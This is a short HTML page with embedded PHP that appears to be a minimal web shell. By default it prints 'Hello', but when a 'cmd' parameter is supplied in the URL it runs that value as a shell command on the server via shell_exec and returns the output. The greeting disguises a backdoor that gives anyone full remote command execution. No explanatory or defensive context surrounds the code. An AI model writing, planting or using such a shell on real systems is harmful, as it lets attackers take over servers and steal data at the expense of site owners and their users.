<html>
<body>
    <?php
    if(isset($_GET['cmd'])) {
        $output = shell_exec($_GET['cmd']);
        echo "<pre>$output</pre>";
    } else {
        echo "<p>Hello</p>";
    }
    ?>
</body>
</html>
